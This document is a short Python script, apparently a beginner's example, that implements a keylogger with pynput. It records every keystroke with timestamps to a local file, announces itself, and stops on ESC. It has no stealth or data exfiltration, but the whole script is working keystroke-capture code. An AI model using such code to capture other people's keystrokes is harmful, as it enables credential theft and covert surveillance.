from pynput.keyboard import Key, Listener # type: ignore
import logging

# 1. Setup the log file where keystrokes will be saved
log_dir = "" # Leave empty to save in the same folder as the script
# Updated logging setup
logging.basicConfig(filename=("key_log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s',
                    force=True) # This forces the file to be created

def on_press(key):
    # This function runs every time a key is pressed
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handles special keys (Space, Enter, etc.)
        logging.info(f"Special key: {key}")

def on_release(key):
    # This function stops the keylogger if you press the ESC key
    if key == Key.esc:
        print("Stopping Keylogger...")
        return False

print("--- Keylogger Active ---")
print("Press 'ESC' to stop and save the log.")

# 2. Start the 'Listener' to capture keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()